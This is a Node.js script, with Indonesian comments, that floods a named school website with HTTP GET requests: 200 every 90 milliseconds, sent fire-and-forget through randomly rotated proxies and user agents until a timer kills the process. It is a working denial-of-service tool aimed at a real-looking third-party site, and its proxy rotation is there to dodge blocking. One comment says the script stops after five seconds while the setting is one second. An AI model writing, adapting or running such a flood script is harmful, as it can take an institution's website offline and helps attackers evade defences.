const fs = require('fs');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

// --- KONFIGURASI ---
const TARGET_URL = 'https://smpn1parang.sch.id'; 
const REQUESTS_PER_LOOP = 200;   // Jumlah request yang dikirim setiap kali loop berjalan
const INTERVAL_MS = 90;       // Jeda antar loop dalam Milidetik (Saran: Jangan di bawah 100ms)
const DURATION_SECONDS = 1;    // Script mati otomatis setelah 5 detik
const TIMEOUT = 5000;          // Timeout per request

// --- FUNGSI HELPER ---

function loadList(filePath) {
    try {
        const data = fs.readFileSync(filePath, 'utf-8');
        return data.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error(`[Error] Gagal membaca file: ${filePath}`);
        process.exit(1);
    }
}

function getRandomItem(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// --- FUNGSI REQUEST ---

async function visitWeb(requestId) {
    const proxies = loadList('./proxy.txt');
    const userAgents = loadList('./ua.txt');

    if (proxies.length === 0 || userAgents.length === 0) return;

    const randomProxy = getRandomItem(proxies);
    const randomUA = getRandomItem(userAgents);
    const proxyUrl = randomProxy.startsWith('http') ? randomProxy : `http://${randomProxy}`;

    try {
        const httpsAgent = new HttpsProxyAgent(proxyUrl);

        // Request dikirim tanpa menunggu (fire and forget)
        axios.get(TARGET_URL, {
            httpsAgent: httpsAgent,
            headers: { 'User-Agent': randomUA, 'Connection': 'close' },
            timeout: TIMEOUT
        }).then(response => {
            
            console.log(`[Req #${requestId}] ✅ ${response.status} | IP: ${randomProxy}`);
        }).catch(error => {
            // Error handler sederhana
            let msg = error.message;
            if (error.response) msg = `Status ${error.response.status}`;
            console.error(`[Req #${requestId}] ❌ ${msg}`);
        });
        
    } catch (error) {
        console.error(`[Req #${requestId}] Error Agent: ${error.message}`);
    }
}

// --- LOGIKA UTAMA ---

function startTraffic() {
    console.log(`=== MULAI: ${REQUESTS_PER_LOOP} req setiap ${INTERVAL_MS}ms ===`);
    console.log(`=== Auto-Kill dalam ${DURATION_SECONDS} detik ===\n`);
    
    let totalRequestsSent = 0;

    // 1. Loop Pengiriman menggunakan setInterval dengan variabel INTERVAL_MS
    const intervalId = setInterval(() => {
        for (let i = 0; i < REQUESTS_PER_LOOP; i++) {
            totalRequestsSent++;
            visitWeb(totalRequestsSent)
            console.log('mantappp')
            ;
        }
    }, INTERVAL_MS); // <--- Kecepatan diatur di sini

    // 2. Kill Switch
    setTimeout(() => {
        clearInterval(intervalId);
        console.log(`\n=== WAKTU HABIS (${DURATION_SECONDS} detik) ===`);
        console.log("=== Mematikan proses... ===");
        process.exit(0);
    }, DURATION_SECONDS * 1000); 
}

startTraffic();